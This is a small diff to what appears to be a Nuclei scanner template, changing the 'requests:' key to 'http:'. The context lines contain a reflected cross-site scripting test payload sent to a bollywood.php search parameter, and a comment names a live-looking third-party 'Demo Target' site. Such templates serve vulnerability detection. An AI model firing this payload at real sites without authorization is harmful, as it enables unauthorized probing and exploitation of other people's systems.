@@ -10,7 +10,7 @@ info:
   #Software Link: https://nscript.com/portfolio
   #Demo Target: http://apjsingapore.com
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/bollywood.php?s="><script>alert(document.domain)</script>'
